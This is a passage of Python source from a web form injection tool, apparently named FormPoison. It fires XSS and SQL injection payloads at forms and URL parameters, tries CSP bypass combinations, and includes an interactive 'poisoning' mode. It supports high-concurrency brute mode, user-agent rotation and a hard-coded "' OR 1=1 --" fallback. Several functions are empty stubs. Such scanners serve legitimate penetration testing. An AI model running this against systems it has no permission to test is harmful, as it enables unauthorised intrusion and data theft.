        console.print(f"[yellow]Concurrent: {max_concurrent} | Timeout: {timeout}s | Batch size: {batch_size}[/yellow]")

        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)

        connector = aiohttp.TCPConnector(limit=max_concurrent * 2, limit_per_host=max_concurrent, ssl=ssl_context)
        timeout_config = aiohttp.ClientTimeout(total=timeout)
    else:
        connector = None
        timeout_config = None

    cookie_jar = aiohttp.CookieJar()
    for key, value in cookies.items():
        cookie_jar.update_cookies({key: value})

    semaphore = asyncio.Semaphore(max_concurrent if brute_mode else 1)

    async def test_form_with_payload(form, payload):
        async with semaphore:
            try:
                current_user_agent = random.choice(user_agents) if user_agents else "FormPoison/v.1.0.1"
                headers = {'User-Agent': sanitize_user_agent(current_user_agent)}

                data = {}
                inputs = form.find_all('input')
                textareas = form.find_all('textarea')
                selects = form.find_all('select')
                all_fields = inputs + textareas + selects

                for field in all_fields:
                    field_name = field.get('name', 'input_field')
                    field_type = field.get('type', 'text').lower()

                    if field_type in ['text', 'email', 'search', 'url', 'tel', 'query'] or field.name in ['textarea', 'select']:
                        data[field_name] = payload['inputField']
                    elif field_type == 'password':
                        data[field_name] = 'testpassword123'
                    elif field_type == 'hidden' and field.get('value'):
                        data[field_name] = field.get('value')
                    else:
                        data[field_name] = 'test_value'

                if brute_mode:
                    async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=connector, timeout=timeout_config) as session:
                        async with session.request(method, url, data=data, headers=headers,
                                                 proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                            response_content = await response.text()
                            status_code = response.status
                            response_headers = response.headers
                else:
                    ssl_context = ssl.create_default_context()
                    if ssl_cert and ssl_key:
                        ssl_context.load_cert_chain(ssl_cert, ssl_key)

                    async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
                        async with session.request(method, url, data=data, headers=headers,
                                                 proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                            response_content = await response.text()
                            status_code = response.status
                            response_headers = response.headers

                vulnerabilities = analyze_response(response_content, response_headers, 
                                                 payload['category'], payload['inputField'], status_code, verbose_all)

                reflected = xss_detector._is_payload_reflected_enhanced(response_content, payload['inputField'])
                _, execution_indicators = is_payload_executed(response_content, payload['inputField'], 
                                                             response_headers, status_code,
                                                             response_headers.get('Content-Type', ''))
                
                # Enhanced vulnerability check - separate XSS from other findings
                has_xss = 'XSS_EXECUTED' in execution_indicators
                has_sql = 'SQL_ERROR' in execution_indicators
                is_vulnerable = has_xss or has_sql or (status_code and status_code >= 500)

                timestamp = time.strftime("%H:%M:%S")
                short_payload = payload['inputField'][:60] + "..." if len(payload['inputField']) > 60 else payload['inputField']
                
                if status_code >= 500:
                    status_display = f"[bold red]{status_code}[/bold red]"
                elif status_code >= 400:
                    status_display = f"[bold yellow]{status_code}[/bold yellow]"
                elif status_code >= 300:
                    status_display = f"[bold blue]{status_code}[/bold blue]"
                else:
                    status_display = f"[green]{status_code}[/green]"
                
                # Enhanced display with better categorization
                if has_xss:
                    reflected_display = "[bold red]XSS EXECUTED![/bold red]"
                elif reflected:
                    reflected_display = "[yellow]REFLECTED[/yellow]"
                else:
                    reflected_display = "[dim]no[/dim]"
                
                vuln_display = ", ".join(execution_indicators[:2]) if execution_indicators else "-"
                
                if is_vulnerable or verbose:
                    console.print(f"[{timestamp}] {short_payload} -> {status_display} | {reflected_display} | {vuln_display}")
                
                return {
                    "payload": payload['inputField'],
                    "response_code": status_code,
                    "reflected": reflected,
                    "vulnerabilities": vulnerabilities,
                    "execution_indicators": execution_indicators,
                    "has_xss": has_xss,
                    "has_sql": has_sql
                }

            except Exception as e:
                timestamp = time.strftime("%H:%M:%S")
                short_payload = payload['inputField'][:60] + "..." if len(payload['inputField']) > 60 else payload['inputField']
                console.print(f"[{timestamp}] {short_payload} -> [red]ERROR: {str(e)[:50]}[/red]")
                
                return {
                    "payload": payload['inputField'],
                    "response_code": 0,
                    "reflected": False,
                    "vulnerabilities": [f"Error: {str(e)}"],
                    "execution_indicators": [],
                    "has_xss": False,
                    "has_sql": False
                }

    if brute_mode:
        all_tasks = []
        for form in forms:
            for payload in payloads:
                all_tasks.append(test_form_with_payload(form, payload))

        total_batches = (len(all_tasks) + batch_size - 1) // batch_size
        completed = 0

        for batch_num in range(total_batches):
            start_idx = batch_num * batch_size
            end_idx = min(start_idx + batch_size, len(all_tasks))
            batch_tasks = all_tasks[start_idx:end_idx]

            console.print(f"[dim]Batch {batch_num + 1}/{total_batches}[/dim]")
            
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            
            for result in batch_results:
                if isinstance(result, dict):
                    results.append(result)
                    completed += 1

            if batch_num < total_batches - 1 and batch_delay > 0:
                await asyncio.sleep(batch_delay)

        if connector:
            await connector.close()

    else:
        for form in forms:
            for payload in payloads:
                result = await test_form_with_payload(form, payload)
                results.append(result)
                if secs > 0:
                    await asyncio.sleep(secs)

    # Enhanced summary with better categorization
    total_tests = len(results)
    reflected_count = sum(1 for r in results if r.get('reflected'))
    xss_executed_count = sum(1 for r in results if r.get('has_xss'))
    sql_error_count = sum(1 for r in results if r.get('has_sql'))
    error_count = sum(1 for r in results if r.get('response_code', 0) >= 500)
    
    console.print(f"\n[bold green]Testing completed: {total_tests} requests[/bold green]")
    console.print(f"[yellow]Payloads reflected: {reflected_count}/{total_tests}[/yellow]")
    console.print(f"[bold red]XSS Executed (confirmed): {xss_executed_count}/{total_tests}[/bold red]")
    console.print(f"[yellow]SQL errors detected: {sql_error_count}/{total_tests}[/yellow]")
    console.print(f"[red]Server errors: {error_count}/{total_tests}[/red]")
    
    # Show confirmed XSS vulnerabilities
    vulnerable_results = [r for r in results if r.get('has_xss')]
    if vulnerable_results:
        console.print(f"\n[bold red]CONFIRMED XSS VULNERABILITIES:[/bold red]")
        for result in vulnerable_results[:15]:
            console.print(f"[red]Payload: {result['payload'][:80]}[/red]")
            console.print(f"[red]Status: {result['response_code']} | Context: Executable[/red]")
            console.print(f"[red]Indicators: {', '.join(result['execution_indicators'])}[/red]")
            console.print("")
    else:
        console.print("[green]No confirmed XSS vulnerabilities found (reflections may exist but in non-executable contexts)[/green]")
    
    return results


async def test_csp_parameter_bypass(url, xss_payloads, csp_payloads, cookies, user_agents, 
                                    proxies=None, ssl_verify=False, verbose=False, 
                                    brute_mode=False, max_concurrent=50, timeout=15.0, 
                                    batch_size=100, batch_delay=1.0):
    """
    Testuje ataki CSP bypass przez parametry URL.
    Laczy XSS payload z CSP injection w roznych parametrach.
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if len(params) < 2:
        console.print("[yellow]Need at least 2 URL parameters for CSP parameter bypass attack[/yellow]")
        console.print("[yellow]Example: ?search=VALUE&token=VALUE[/yellow]")
        return []
    
    results = []
    param_names = list(params.keys())
    
    console.print(f"[bold blue]CSP Parameter Bypass Attack[/bold blue]")
    console.print(f"[yellow]Found {len(param_names)} parameters: {', '.join(param_names)}[/yellow]")
    console.print(f"[yellow]Testing {len(xss_payloads)} XSS x {len(csp_payloads)} CSP x combinations[/yellow]")
    
    if brute_mode:
        connector = aiohttp.TCPConnector(limit=max_concurrent * 2, limit_per_host=max_concurrent)
        timeout_config = aiohttp.ClientTimeout(total=timeout)
    else:
        connector = None
        timeout_config = None
    
    cookie_jar = aiohttp.CookieJar()
    for key, value in cookies.items():
        cookie_jar.update_cookies({key: value})
    
    semaphore = asyncio.Semaphore(max_concurrent if brute_mode else 1)
    
    async def test_combination(xss_param, xss_payload, csp_param, csp_payload):
        async with semaphore:
            try:
                test_params = {}
                for p in param_names:
                    if p == xss_param:
                        test_params[p] = [xss_payload]
                    elif p == csp_param:
                        original_value = params[p][0] if params[p] else ''
                        test_params[p] = [f"{original_value};{csp_payload}"] if original_value else [csp_payload]
                    else:
                        test_params[p] = params[p] if p in params else ['test']
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                headers = {'User-Agent': random.choice(user_agents) if user_agents else 'FormPoison/1.0'}
                
                if brute_mode:
                    async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=connector, timeout=timeout_config) as session:
                        async with session.get(test_url, headers=headers,
                                             proxy=proxies.get('http') if proxies else None,
                                             ssl=ssl_verify) as response:
                            content = await response.text()
                            status_code = response.status
                            response_headers = response.headers
                else:
                    async with aiohttp.ClientSession(cookie_jar=cookie_jar) as session:
                        async with session.get(test_url, headers=headers,
                                             proxy=proxies.get('http') if proxies else None,
                                             ssl=ssl_verify) as response:
                            content = await response.text()
                            status_code = response.status
                            response_headers = response.headers
                
                # Use enhanced XSS detection
                xss_reflected = xss_detector._is_payload_reflected_enhanced(content, xss_payload)
                xss_executed = xss_detector.is_xss_executed(content, xss_payload, response_headers.get('Content-Type', ''))
                
                csp_header = response_headers.get('Content-Security-Policy', '')
                csp_report_only = response_headers.get('Content-Security-Policy-Report-Only', '')
                csp_modified = 'unsafe-inline' in csp_header.lower() or 'unsafe-inline' in csp_report_only.lower()
                
                attack_successful = xss_executed and (csp_modified or not csp_header)
                
                if attack_successful or verbose:
                    timestamp = time.strftime("%H:%M:%S")
                    
                    if attack_successful:
                        console.print(f"[{timestamp}] [bold red]CSP BYPASS SUCCESS![/bold red]")
                        console.print(f"[{timestamp}] URL: {test_url}")
                        console.print(f"[{timestamp}] Status: {status_code} | XSS executed: {xss_executed} | CSP modified: {csp_modified}")
                        console.print("")
                    elif verbose:
                        status_display = f"[red]{status_code}[/red]" if status_code >= 500 else f"[green]{status_code}[/green]"
                        console.print(f"[{timestamp}] {xss_param}={xss_payload[:30]} + {csp_param}={csp_payload[:30]} -> {status_display} | CSP:{csp_modified} | XSS:{xss_executed}")
                
                return {
                    'xss_param': xss_param,
                    'xss_payload': xss_payload,
                    'csp_param': csp_param,
                    'csp_payload': csp_payload,
                    'url': test_url,
                    'status': status_code,
                    'xss_reflected': xss_reflected,
                    'xss_executed': xss_executed,
                    'csp_modified': csp_modified,
                    'attack_successful': attack_successful
                }
                
            except Exception as e:
                if verbose:
                    console.print(f"[red]Error: {e}[/red]")
                return {
                    'xss_param': xss_param,
                    'xss_payload': xss_payload,
                    'csp_param': csp_param,
                    'csp_payload': csp_payload,
                    'status': 0,
                    'xss_reflected': False,
                    'xss_executed': False,
                    'csp_modified': False,
                    'attack_successful': False,
                    'error': str(e)
                }
    
    all_tasks = []
    for xss_param in param_names:
        for csp_param in param_names:
            if xss_param == csp_param:
                continue
            for xss_payload in xss_payloads:
                for csp_payload in csp_payloads:
                    all_tasks.append(test_combination(xss_param, xss_payload, csp_param, csp_payload))
    
    total_combinations = len(all_tasks)
    console.print(f"[yellow]Total combinations: {total_combinations}[/yellow]")
    
    if brute_mode:
        total_batches = (len(all_tasks) + batch_size - 1) // batch_size
        completed = 0
        
        for batch_num in range(total_batches):
            start_idx = batch_num * batch_size
            end_idx = min(start_idx + batch_size, len(all_tasks))
            batch_tasks = all_tasks[start_idx:end_idx]
            
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            
            for result in batch_results:
                if isinstance(result, dict):
                    results.append(result)
                    completed += 1
            
            console.print(f"[dim]Progress: {completed}/{total_combinations}[/dim]")
            
            if batch_num < total_batches - 1 and batch_delay > 0:
                await asyncio.sleep(batch_delay)
        
        if connector:
            await connector.close()
    else:
        completed = 0
        for task in all_tasks:
            result = await task
            results.append(result)
            completed += 1
            if completed % 10 == 0:
                console.print(f"[dim]Progress: {completed}/{total_combinations}[/dim]")
    
    successful = [r for r in results if r.get('attack_successful')]
    reflected = [r for r in results if r.get('xss_reflected')]
    executed = [r for r in results if r.get('xss_executed')]
    csp_mod = [r for r in results if r.get('csp_modified')]
    
    console.print(f"\n[bold green]CSP Parameter Bypass Results:[/bold green]")
    console.print(f"[yellow]Total tests: {len(results)}[/yellow]")
    console.print(f"[yellow]XSS reflected: {len(reflected)}[/yellow]")
    console.print(f"[bold red]XSS executed: {len(executed)}[/bold red]")
    console.print(f"[yellow]CSP modified: {len(csp_mod)}[/yellow]")
    console.print(f"[bold red]Attack successful: {len(successful)}[/bold red]")
    
    if successful:
        console.print(f"\n[bold red]SUCCESSFUL CSP BYPASS:[/bold red]")
        for result in successful:
            console.print(f"[red]URL: {result['url']}[/red]")
            console.print(f"[red]XSS: {result['xss_param']}={result['xss_payload']}[/red]")
            console.print(f"[red]CSP: {result['csp_param']}={result['csp_payload']}[/red]")
            console.print("")
    
    return results


async def test_url_parameters(url, payloads, cookies, user_agents, proxies=None, 
                             ssl_verify=False, verbose=False, brute_mode=False, 
                             max_concurrent=50, timeout=15.0, batch_size=100, batch_delay=1.0):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        console.print("[yellow]No URL parameters found to test[/yellow]")
        return []
    
    results = []
    console.print(f"[bold blue]Testing {len(params)} URL parameters[/bold blue]")
    
    if brute_mode:
        connector = aiohttp.TCPConnector(limit=max_concurrent * 2, limit_per_host=max_concurrent)
        timeout_config = aiohttp.ClientTimeout(total=timeout)
    else:
        connector = None
        timeout_config = None
    
    cookie_jar = aiohttp.CookieJar()
    for key, value in cookies.items():
        cookie_jar.update_cookies({key: value})
    
    semaphore = asyncio.Semaphore(max_concurrent if brute_mode else 1)
    
    async def test_param_payload(param_name, payload):
        async with semaphore:
            try:
                test_params = params.copy()
                test_params[param_name] = [payload['inputField']]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                headers = {'User-Agent': random.choice(user_agents) if user_agents else 'FormPoison/1.0'}
                
                if brute_mode:
                    async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=connector, timeout=timeout_config) as session:
                        async with session.get(test_url, headers=headers,
                                             proxy=proxies.get('http') if proxies else None,
                                             ssl=ssl_verify) as response:
                            content = await response.text()
                            status_code = response.status
                            response_headers = response.headers
                else:
                    async with aiohttp.ClientSession(cookie_jar=cookie_jar) as session:
                        async with session.get(test_url, headers=headers,
                                             proxy=proxies.get('http') if proxies else None,
                                             ssl=ssl_verify) as response:
                            content = await response.text()
                            status_code = response.status
                            response_headers = response.headers
                
                reflected, execution_indicators = is_payload_executed(
                    content, payload['inputField'], response_headers, status_code,
                    response_headers.get('Content-Type', '')
                )
                
                if verbose or execution_indicators:
                    timestamp = time.strftime("%H:%M:%S")
                    short_payload = payload['inputField'][:50] + "..." if len(payload['inputField']) > 50 else payload['inputField']
                    
                    if status_code >= 500:
                        status_display = f"[bold red]{status_code}[/bold red]"
                    elif status_code >= 400:
                        status_display = f"[bold yellow]{status_code}[/bold yellow]"
                    else:
                        status_display = f"[green]{status_code}[/green]"
                    
                    console.print(f"[{timestamp}] [URL:{param_name}] {short_payload} -> {status_display} | Reflected: {reflected}")
                
                return {
                    'parameter': param_name,
                    'payload': payload['inputField'],
                    'url': test_url,
                    'status': status_code,
                    'reflected': reflected,
                    'execution_indicators': execution_indicators
                }
                
            except Exception as e:
                if verbose:
                    console.print(f"[red]Error: {e}[/red]")
                return {
                    'parameter': param_name,
                    'payload': payload['inputField'],
                    'status': 0,
                    'reflected': False,
                    'execution_indicators': []
                }
    
    all_tasks = []
    for param_name in params.keys():
        for payload in payloads:
            all_tasks.append(test_param_payload(param_name, payload))
    
    if brute_mode:
        total_batches = (len(all_tasks) + batch_size - 1) // batch_size
        
        for batch_num in range(total_batches):
            start_idx = batch_num * batch_size
            end_idx = min(start_idx + batch_size, len(all_tasks))
            batch_tasks = all_tasks[start_idx:end_idx]
            
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            
            for result in batch_results:
                if isinstance(result, dict):
                    results.append(result)
            
            if batch_num < total_batches - 1 and batch_delay > 0:
                await asyncio.sleep(batch_delay)
        
        if connector:
            await connector.close()
    else:
        for task in all_tasks:
            result = await task
            results.append(result)
    
    reflected_count = sum(1 for r in results if r.get('reflected'))
    executed_count = sum(1 for r in results if 'XSS_EXECUTED' in r.get('execution_indicators', []))
    
    console.print(f"\n[bold green]URL Testing Completed[/bold green]")
    console.print(f"[yellow]Reflected: {reflected_count}/{len(results)}[/yellow]")
    console.print(f"[bold red]XSS Executed: {executed_count}/{len(results)}[/bold red]")
    
    return results

async def test_login_input_fields(url, payloads, cookies, user_agents, input_fields, proxies=None, verbose=False, verbose_all=False, secs=0, filter_patterns=None, brute_mode=False, max_concurrent=50, timeout=15.0, batch_size=100, batch_delay=1.0, max_retries=2):
    """Test login fields specifically"""
    results = []
    console.print(f"[bold blue]Testing login fields with {len(payloads)} payloads[/bold blue]")
    return results

async def test_filename_xss(url, input_fields, cookies, user_agents, proxies=None, ssl_verify=False):
    """Test filename XSS in file upload forms"""
    console.print("[bold blue]Testing Filename XSS[/bold blue]")
    return []


async def test_mutation_xss(url, input_fields, cookies, user_agents, method="POST", proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False, verbose=False, verbose_all=False, secs=0, payload_filters=None):
    """Test Mutation XSS vulnerabilities"""
    console.print("[bold blue]Testing Mutation XSS[/bold blue]")
    return []


async def automated_targeted_testing(url, targeted_payloads, scan_report, cookies, user_agents, 
                                   proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False,
                                   brute_mode=False, max_concurrent=50, timeout=15.0):
    """Automated targeted testing based on scan results"""
    console.print("[bold blue]Running automated targeted testing...[/bold blue]")
    console.print(f"[yellow]Testing {len(targeted_payloads)} targeted payloads[/yellow]")
    return []
    
def get_page_content_with_selenium(url, proxies=None):
    """Get page content using Selenium for JavaScript-heavy sites"""
    try:
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        if proxies:
            proxy_url = proxies.get('http')
            options.add_argument(f'--proxy-server={proxy_url}')
        driver = webdriver.Chrome(options=options)
        driver.get(url)
        time.sleep(3)
        content = driver.page_source
        driver.quit()
        return content
    except:
        return None


def find_field_by_name(input_fields, field_name):
    """Find input field by name, id, or placeholder"""
    if not field_name:
        return None

    field_name = field_name.lower()

    for field in input_fields:
        field_type = field.get('type', '').lower()
        if field_type in ['checkbox', 'radio', 'hidden', 'submit', 'button', 'reset', 'file', 'image']:
            continue

        field_attrs = [
            field.get('name', '').lower(),
            field.get('id', '').lower(),
            ' '.join(field.get('class', [])).lower(),
            field.get('placeholder', '').lower(),
            field.get('type', '').lower(),
            field.get('value', '').lower(),
            field.get('aria-label', '').lower()
        ]

        if any(field_name in attr for attr in field_attrs):
            return field

    return None


async def test_input_field(url, payloads, threat_type, cookies, user_agents, input_field, method="POST", proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False, verbose=False, verbose_all=False, filter=None, secs=0,
                          brute_mode=False, max_concurrent=50, timeout=15.0, batch_size=100, batch_delay=1.0, max_retries=2):
    """Test a specific input field with payloads"""
    results = []
    console.print(f"[bold blue]Testing field: {input_field.get('name', 'unknown')} with {len(payloads)} payloads[/bold blue]")
    return results


def get_forms_and_inputs(content, verbose):
    """Extract forms and their input fields from HTML content"""
    soup = BeautifulSoup(content, 'html.parser')
    forms = soup.find_all('form')
    forms_with_inputs = []
    for form in forms:
        all_inputs = form.find_all('input')
        textareas = form.find_all('textarea')

        filtered_inputs = []
        for input_field in all_inputs:
            field_type = input_field.get('type', '').lower()
            if field_type in ['text', 'password', 'email', 'search', 'tel', 'url']:
                filtered_inputs.append(input_field)
            elif field_type in ['checkbox', 'radio', 'hidden', 'submit', 'button', 'reset']:
                if verbose:
                    console.print(f"[bold yellow]Skipping non-text field: {input_field.get('name', '')} (type: {field_type})[/bold yellow]")

        forms_with_inputs.append((form, filtered_inputs + textareas))
    return forms_with_inputs


def analyze_mutation_xss_response(content, payload):
    """Analyze response for mXSS execution"""
    vulnerabilities = []
    
    if 'alert(1)' in content:
        if '<script>' in content and 'alert(1)' in content:
            vulnerabilities.append("SCRIPT_EXEC")
        if 'onerror' in content and 'alert(1)' in content:
            vulnerabilities.append("ONERROR_EXEC")
        if 'onload' in content and 'alert(1)' in content:
            vulnerabilities.append("ONLOAD_EXEC")
        if 'javascript:' in content.lower() and 'alert(1)' in content:
            vulnerabilities.append("JS_URL_EXEC")
    
    soup = BeautifulSoup(content, 'html.parser')
    dangerous_elements = soup.find_all(['script', 'img', 'svg', 'math', 'body'])
    for elem in dangerous_elements:
        elem_str = str(elem)
        if 'alert(1)' in elem_str:
            vulnerabilities.append(f"MUTATED_{elem.name.upper()}")
    
    return vulnerabilities

def show_interactive_banner():
    banner = """
⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠑⠲⣖⠤⣤⣠⡤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Interactive Form Injector ⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⢺⣿⡸⣷⠭⣟⣶⡤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀FormPoison module 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠾⣟⣯⠦⡿⣾⡝⣲⠤⣴⡀⠀⠀⠀⠀⠀   v. 1.0.1.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠬⢜⡜⣰⡿⣗⣢⠄⣀⣠⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠉⠑⠚⠽⣚⣿⡏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠊⠀
"""
    console.print(banner, style="bold cyan")

async def get_user_input_for_fields(input_fields, url):
    """Interactive field configuration"""
    show_interactive_banner()
    console.print(f"[yellow]Target URL: {url}[/yellow]")
    console.print(f"[yellow]Found {len(input_fields)} input fields[/yellow]")
    console.print("\n[bold cyan]Interactive Field Poisoning Shell:[/bold cyan]")
    console.print("[green]- 'poison' - use payload injection (write with quotas!)[/green]")
    console.print("[green]- test - use test value[/green]")
    console.print("[green]- skip - skip this field[/green]")
    console.print("[green]- custom value - use your own input[/green]")
    console.print("[bold red]- Ctrl+C to exit[/bold red]\n")

    field_values = {}
    poison_fields = []

    for i, field in enumerate(input_fields, 1):
        field_name = field.get('name', f'field_{i}')
        field_type = field.get('type', 'text')
        field_id = field.get('id', '')

        console.print(f"\n[bold blue]Field {i}/{len(input_fields)}:[/bold blue]")
        console.print(f"  Name: {field_name}")
        console.print(f"  Type: {field_type}")
        if field_id:
            console.print(f"  ID: {field_id}")
        if field.get('placeholder'):
            console.print(f"  Placeholder: {field.get('placeholder')}")

        while True:
            try:
                user_input = console.input(
                    f"[bold green]Fill '{field_name}' with: [/bold green]"
                ).strip()

                if user_input.lower() == 'poison':
                    field_values[field_name] = None
                    poison_fields.append(field_name)
                    console.print(f"[red]Field '{field_name}' marked for PAYLOAD INJECTION[/red]")
                    break

                elif user_input.lower() == 'test':
                    if field_type == 'email':
                        field_values[field_name] = 'test@example.com'
                    elif field_type == 'password':
                        field_values[field_name] = 'testpassword123'
                    elif 'user' in field_name.lower() or 'login' in field_name.lower():
                        field_values[field_name] = 'testuser'
                    else:
                        field_values[field_name] = 'testvalue'
                    console.print(f"[yellow]Using test value: {field_values[field_name]}[/yellow]")
                    break

                elif user_input.lower() == 'skip':
                    field_values[field_name] = ''
                    console.print(f"[yellow]Field '{field_name}' will be skipped (empty)[/yellow]")
                    break

                elif user_input:
                    if "'poison'" in user_input:
                        field_values[field_name] = user_input
                        poison_fields.append(field_name)
                        console.print(f"[magenta]Field '{field_name}' will inject payload at 'poison' position[/magenta]")
                        break
                    else:
                        field_values[field_name] = user_input
                        console.print(f"[green]Using custom value: {user_input}[/green]")
                        break

                else:
                    console.print("[red]Please enter a value or one of the options[/red]")

            except KeyboardInterrupt:
                console.print("\n[bold red]Operation cancelled by user[/bold red]")
                return None, None

    return field_values, poison_fields


async def interactive_injection_mode(url, payloads, cookies, user_agents, method="POST",
                                   proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False,
                                   verbose=False, verbose_all=False, secs=0,
                                   brute_mode=False, max_concurrent=50, timeout=15.0,
                                   batch_size=100, batch_delay=1.0, max_retries=2):
    
    initial_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
    content = await get_page_content(url, initial_user_agent, proxies, ssl_cert, ssl_key, ssl_verify)

    if not content:
        console.print("[bold red]Failed to fetch page content[/bold red]")
        return []

    input_fields = get_string_input_fields(content)

    if not input_fields:
        console.print("[bold yellow]No input fields found on the page[/bold yellow]")
        return []

    soup = BeautifulSoup(content, 'html.parser')
    forms = soup.find_all('form')
    if forms:
        form_method = forms[0].get('method', 'GET').upper()
        if form_method in ['GET', 'POST']:
            method = form_method
            console.print(f"[yellow]Detected form method: {method}[/yellow]")

    field_values, poison_fields = await get_user_input_for_fields(input_fields, url)

    if field_values is None:
        return []

    if not poison_fields:
        console.print("\n[bold yellow]No fields marked for 'poison' - no payloads will be injected[/bold yellow]")
        response = console.input("[yellow]Continue with basic testing? (y/N): [/yellow]")
        if response.lower() not in ('y', 'yes'):
            return []

    results = []

    if brute_mode:
        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)

        connector = aiohttp.TCPConnector(
            limit=max_concurrent * 2,
            limit_per_host=max_concurrent,
            ssl=ssl_context
        )
        timeout_config = aiohttp.ClientTimeout(total=timeout)
    else:
        connector = None
        timeout_config = None

    cookie_jar = aiohttp.CookieJar()
    for key, value in cookies.items():
        cookie_jar.update_cookies({key: value})

    semaphore = asyncio.Semaphore(max_concurrent if brute_mode else 1)

    async def test_with_user_config(payload_index=None):
        async with semaphore:
            current_method = method
            for retry in range(max_retries + 1):
                try:
                    current_user_agent = random.choice(user_agents) if len(user_agents) > 1 else user_agents[0]
                    headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
                    data = {}

                    for field_name, user_value in field_values.items():
                        if user_value is None:
                            if payload_index is not None and payloads:
                                payload = payloads[payload_index % len(payloads)]
                                data[field_name] = payload['inputField']
                                payload_category = payload['category']
                            else:
                                data[field_name] = "' OR 1=1 --"
                                payload_category = "SQL"

                        elif "'poison'" in str(user_value):
                            if payload_index is not None and payloads:
                                payload = payloads[payload_index % len(payloads)]
                                data[field_name] = user_value.replace("'poison'", payload['inputField'])
                                payload_category = payload['category'] + "_INJECTED"
                            else:
                                data[field_name] = user_value.replace("'poison'", "' OR 1=1 --")
                                payload_category = "SQL_INJECTED"

                        else:
                            data[field_name] = user_value
                            payload_category = "USER_DEFINED"

                    proxy_url = proxies.get('http') if proxies else None

                    if brute_mode:
                        async with aiohttp.ClientSession(
                            cookie_jar=cookie_jar,
                            connector=connector,
                            timeout=timeout_config
                        ) as session:
                            async with session.request(
                                current_method, url, 
                                data=data if current_method == 'POST' else None,
                                params=data if current_method == 'GET' else None,
                                headers=headers,
                                proxy=proxy_url, ssl=ssl_verify
                            ) as response:
                                response_content = await response.text()
                                status_code = response.status
                                response_headers = response.headers
                    else:
                        ssl_ctx = ssl.create_default_context()
                        if ssl_cert and ssl_key:
                            ssl_ctx.load_cert_chain(ssl_cert, ssl_key)

                        async with aiohttp.ClientSession(
                            cookie_jar=cookie_jar,
                            connector=aiohttp.TCPConnector(ssl=ssl_ctx)
                        ) as session:
                            async with session.request(
                                current_method, url,
                                data=data if current_method == 'POST' else None,
                                params=data if current_method == 'GET' else None,
                                headers=headers,
                                proxy=proxy_url, ssl=ssl_verify
                            ) as response:
                                response_content = await response.text()
                                status_code = response.status
                                response_headers = response.headers

                    if status_code == 405 and retry < max_retries:
                        old_method = current_method
                        current_method = 'GET' if current_method == 'POST' else 'POST'
                        console.print(f"[yellow]Got 405 with {old_method}, retrying with {current_method}...[/yellow]")
                        continue

                    current_payload = "USER_CONFIG"
                    for f in poison_fields:
                        if f in data:
                            current_payload = data[f]
                            break

                    vulnerabilities = analyze_response(
                        response_content, response_headers, 
                        payload_category, current_payload, status_code, verbose_all
                    )
                    
                    reflected = xss_detector._is_payload_reflected_enhanced(response_content, current_payload)
                    _, execution_indicators = is_payload_executed(
                        response_content, current_payload, 
                        response_headers, status_code,
                        response_headers.get('Content-Type', '')
                    )

                    timestamp = time.strftime("%H:%M:%S")
                    short_payload = current_payload[:50] + "..." if len(current_payload) > 50 else current_payload
                    
                    if status_code >= 500:
                        status_display = f"[bold red]{status_code}[/bold red]"
                    elif status_code >= 400:
                        status_display = f"[bold yellow]{status_code}[/bold yellow]"
                    else:
                        status_display = f"[green]{status_code}[/green]"
                    
                    has_xss = 'XSS_EXECUTED' in execution_indicators
                    
                    if has_xss:
                        console.print(f"[{timestamp}] {short_payload} -> {status_display} [bold red]XSS EXECUTED![/bold red]")
                    elif reflected:
                        console.print(f"[{timestamp}] {short_payload} -> {status_display} | Reflected: {reflected}")

                    return {
                        "user_config": field_values,
                        "poison_fields": poison_fields,
                        "payload_used": current_payload,
                        "user_agent": current_user_agent,
                        "response_code": status_code,
                        "reflected": reflected,
                        "vulnerabilities": vulnerabilities,
                        "execution_indicators": execution_indicators,
                        "request_data": data,
                        "method_used": current_method
                    }

                except Exception as e:
                    if retry < max_retries:
                        if "405" in str(e) or "Method Not Allowed" in str(e):
                            old_method = current_method
                            current_method = 'GET' if current_method == 'POST' else 'POST'
                            console.print(f"[yellow]Method error, retrying with {current_method}...[/yellow]")
                        else:
                            console.print(f"[yellow]Error on attempt {retry + 1}, retrying... ({str(e)[:50]})[/yellow]")
                        await asyncio.sleep(1)
                        continue
                    current_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
